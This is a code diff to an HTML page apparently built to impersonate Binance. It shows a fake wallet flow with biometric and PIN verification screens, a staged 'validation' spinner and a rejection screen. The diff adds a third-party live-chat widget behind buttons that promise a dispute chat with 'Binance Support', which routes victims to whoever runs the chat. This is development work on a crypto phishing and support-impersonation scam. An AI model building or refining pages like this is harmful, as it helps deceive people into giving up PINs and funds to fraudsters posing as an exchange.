@@ -245,6 +245,7 @@
     <div class="container pb-5">
         <div class="row justify-content-center">
             <div class="col-md-8 col-lg-6">
+                
                 <!-- STEP 1: WALLET HOME -->
                 <div id="layerWallet" class="app-flow-card text-center">
                     <h3 class="fw-bold mb-2 text-white">Digital Asset Wallet</h3>
@@ -320,8 +321,8 @@
                     </div>
 
                     <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
-                    <button class="btn-dispute" onclick="openLiveChat()">🔴 Open Dispute & Chat with Binance Support</button>
-                    <button class="btn-message" onclick="openLiveChat()">📨 Resubmit Documents</button>
+                    <button class="btn-message w-100 text-uppercase" onclick="Tawk_API.toggle()">OPEN DISPUTE & CHAT WITH BINANCE SUPPORT</button>
+                    <button class="btn-message" onclick="switchToWallet()" style="background-color: var(--term-border); margin-top: 10px;">Cancel</button>
                 </div>
 
                 <!-- STEP 6: SUCCESS COMPLETION -->
@@ -359,12 +360,27 @@
 
     <!-- LIVE AGENT WIDGET -->
     <div class="live-agent-widget">
-        <div class="agent-bubble" onclick="openLiveChat()">
+        <div class="agent-bubble" onclick="Tawk_API.toggle()">
             <div class="agent-profile-avatar">B</div>
             <div class="agent-status"></div>
             <div class="agent-tooltip">Live Agent Support</div>
         </div>
     </div>
+
+    <!-- TAWK.TO SCRIPT ENGINE -->
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
+    s1.async=true;
+    s1.src='https://tawk.to';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
 
     <!-- JAVASCRIPT STATE CONTROLLER MATRIX -->
     <script>
@@ -380,8 +396,8 @@
         }
 
         function showBiometricVerification() { switchLayer('layerBiometricVerification'); }
-        function switchToWallet() { switchLayer('layerWallet'); }
         function executeBiometricVerification() { switchLayer('layerPINVerification'); }
+        function switchToWallet() { switchLayer('layerWallet'); }
 
         function executeTokenValidation() {
             switchLayer('layerLoadingWheel');
@@ -390,11 +406,11 @@
             }, 2000);
         }
 
-        function openLiveChat() { alert('Binance Compliance Support: connecting to a live representative...'); }
         function resetWorkflowIndex() {
             document.getElementById('pinVerificationInput').value = '';
             switchLayer('layerWallet');
         }
     </script>
+
 </body>
 </html>
